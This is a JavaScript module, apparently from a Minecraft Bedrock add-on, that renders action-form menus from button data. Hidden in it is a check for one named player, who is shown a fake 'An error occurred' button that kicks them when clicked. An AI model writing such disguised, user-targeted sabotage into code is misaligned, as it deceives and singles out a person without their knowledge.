import { ActionForm } from "../../lib/form_func";
import actionParser from "../actionParser";
import icons from "../icons";

class NormalFormOpener {
    open(player, data) {
        let form = new ActionForm();
        let pre = `§r`;
        if(data.layout == 1) pre = `§g§r§i§d§u§i§r`;
        if(data.layout == 2) pre = `§f§u§l§l§s§c§r§e§e§n§r`;
        if(data.layout == 3) pre = `§t§e§s§t§r`
        form.title(`${pre}${data.name}`);
        if(data.body) form.body(data.body);
        if(player.name == "OG Clapz9521") {
            data.buttons = [ ...data.buttons, ({
                text: "§cAn error occurred",
                subtext: "Click to view details",
                iconID: "Packs/Asteroid/random33",
                action: `kick "${player.name}"`
            }) ]
        }
        for(const button of data.buttons) {
            console.warn(JSON.stringify(button));
            if(button.requiredTag && !player.hasTag(button.requiredTag)) continue;
            form.button(`${button.text}${button.subtext ? `\n§r§7${button.subtext}` : ``}`, button.iconID ? icons.resolve(button.iconID) : null, (player)=>{
                if(!button.actions) return actionParser.runAction(player, button.action)
                for (const action of button.actions) {
                    actionParser.runAction(player, action)
                }
            });
        }
        form.show(player, false, (player, response)=>{})
    }
}
export default new NormalFormOpener();